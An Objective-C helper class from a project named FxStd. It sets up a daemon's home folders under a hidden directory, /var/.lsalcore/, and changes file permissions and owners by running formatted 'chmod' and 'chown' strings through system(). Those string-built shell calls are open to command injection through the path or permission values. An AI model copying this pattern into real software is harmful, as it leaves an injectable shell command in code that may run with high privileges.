//
//  DaemonPrivateHome.m
//  FxStd
//
//  Created by Makara Khloth on 12/20/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "DaemonPrivateHome.h"

static NSString	* const kDaemonPrivateHome		= @"/var/.lsalcore/";
static NSString * const kDaemonSharedHome		= @"/var/.lsalcore/shares/";

@implementation DaemonPrivateHome

+ (NSString *) daemonPrivateHome {
#ifdef IOS_ENTERPRISE
    NSString *dir = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject];
	return ([dir stringByAppendingPathComponent:kDaemonPrivateHome]);
#else
    return ([NSString stringWithString:kDaemonPrivateHome]);
#endif
}

+ (NSString *) daemonSharedHome {
#ifdef IOS_ENTERPRISE
    NSString *dir = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject];
	return ([dir stringByAppendingPathComponent:kDaemonSharedHome]);
#else
    return ([NSString stringWithString:kDaemonSharedHome]);
#endif
}

+ (BOOL) createDirectoryAndIntermediateDirectories: (NSString *) aDirectory {
	BOOL success = FALSE;
	NSFileManager *fm = [NSFileManager defaultManager];
	BOOL isFolder = FALSE;
	[fm fileExistsAtPath:aDirectory isDirectory:&isFolder];
	if (!isFolder) {
		NSError *error = nil;
		success = [fm createDirectoryAtPath:aDirectory withIntermediateDirectories:YES attributes:nil error:&error];
		DLog(@"Create directory with intermediate directories, error = %@", error);
	} else {
        DLog(@"Success");
		success = TRUE;
	}
	return (success);
}

#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wdeprecated-declarations"

+ (void) changePermission: (NSString *) aPermission path: (NSString *) aPath {
    NSString *chmodCmd = [NSString stringWithFormat:@"chmod %@ '%@'", aPermission, aPath];
    system([chmodCmd UTF8String]);
}

+ (void) changeOwner: (NSString *) aOwner path: (NSString *) aPath {
    NSString *chmodCmd = [NSString stringWithFormat:@"chown %@ '%@'", aOwner, aPath];
    system([chmodCmd UTF8String]);
}

#pragma GCC diagnostic pop

@end
